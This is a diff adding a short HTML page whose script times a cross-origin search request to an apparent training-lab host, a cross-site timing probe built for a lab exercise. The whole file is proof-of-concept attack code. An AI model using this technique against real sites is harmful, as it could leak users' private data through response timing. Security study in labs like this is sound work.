@@ -1,0 +1,17 @@
+<html>
+<body>
+<script>
+
+var xhr = new XMLHttpRequest();
+xhr.open('GET','http://ptl-2d419260-8ca46436.libcurl.so/search?search=^z');
+
+t1 = performance.now();
+xhr.send(null);
+t2 = performance.now();
+document.write(t2-t1);
+
+</script>
+</body>
+</html>
+
+
